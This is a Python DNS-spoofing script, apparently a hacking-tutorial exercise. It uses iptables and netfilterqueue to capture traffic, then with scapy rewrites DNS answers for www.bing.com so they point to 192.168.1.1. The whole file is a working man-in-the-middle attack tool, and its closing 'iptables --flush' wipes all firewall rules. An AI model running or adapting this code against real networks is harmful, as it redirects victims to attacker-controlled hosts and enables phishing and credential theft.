#!/usr/bin/python

import netfilterqueue
import subprocess
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if "www.bing.com" in qname:
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.1")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			del scapy_packet[scapy.IP].len 
			del scapy_packet[scapy.IP].chksum 
			del scapy_packet[scapy.UDP].len 
			del scapy_packet[scapy.UDP].chksum
			packet.set_payload(str(scapy_packet))
	packet.accept()

subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

subprocess.call("iptables --flush",shell=True)


